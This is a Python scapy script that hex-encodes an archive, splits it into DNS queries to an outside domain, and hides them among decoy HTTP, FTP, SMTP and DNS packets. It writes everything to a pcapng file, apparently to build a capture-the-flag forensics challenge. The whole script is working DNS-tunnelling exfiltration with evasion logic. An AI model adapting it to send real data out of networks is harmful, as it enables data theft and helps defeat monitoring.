from scapy.all import *
import random
import string
import time
from tqdm import tqdm

def encode_data_hex(data):
    return data.hex()

def generate_dns_query(encoded_data, domain):
    query = f"{encoded_data}.{domain}"
    return IP(dst="171.211.223.74")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))

def generate_noise_packet():
    protocols = ['HTTP', 'HTTPS', 'FTP', 'SMTP']
    protocol = random.choice(protocols)
    if protocol == 'HTTP':
        return IP(dst="73.34.11.129")/TCP(dport=80)/Raw(load=f"GET /{random_string(20)} HTTP/1.1\r\nHost: {random_string(20)}.com\r\n\r\n")
    elif protocol == 'HTTPS':
        return IP(dst="55.109.27.111")/TCP(dport=443)/Raw(load=f"CONNECT {random_string(20)}.com:443 HTTP/1.1\r\n\r\n")
    elif protocol == 'FTP':
        return IP(dst="192.168.1.9")/TCP(dport=21)/Raw(load=f"USER {random_string(20)}\r\n")
    elif protocol == 'SMTP':
        return IP(dst="192.168.1.3")/TCP(dport=25)/Raw(load=f"MAIL FROM:<{random_string(20)}@concordia.ca>\r\n")

def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def resolve_legitimate_host():
    legitimate_hosts = ['google.com', 'microsoft.com', 'github.com', 'hacker.com']
    host = random.choice(legitimate_hosts)
    return IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=host))

def exfiltrate_archive_via_dns_tunneling(archive_path, domain):
    packets = []
    with open(archive_path, 'rb') as file:
        file_data = file.read()
    
    encoded_data = encode_data_hex(file_data)
    
    chunk_size = 8
    chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    total_packets = len(chunks) * 3  # Ensure noise and legitimate host packets are more than DNS packets
    for _ in tqdm(range(total_packets), desc="Generating traffic"):
        choice = random.choice(['noise', 'dns', 'legitimate'])
        if choice == 'noise':
            packets.append(generate_noise_packet())
        elif choice == 'dns' and chunks:
            chunk = chunks.pop(0)
            packets.append(generate_dns_query(chunk, domain))
        else:
            packets.append(resolve_legitimate_host())
        time.sleep(0.01)  # Small delay to simulate continuous traffic
    
    print("Traffic generation complete")
    return packets

ip_file_to_exfiltrate = "Exfiltration.zip"
domain = "athackctf.com"

# Exfiltrate IP file via DNS tunneling with noise and legitimate host resolution
all_packets = exfiltrate_archive_via_dns_tunneling(ip_file_to_exfiltrate, domain)

# Save to pcapng file
wrpcap("exfiltration_traffic.pcapng", all_packets)

print("Traffic saved to exfiltration_traffic.pcapng")
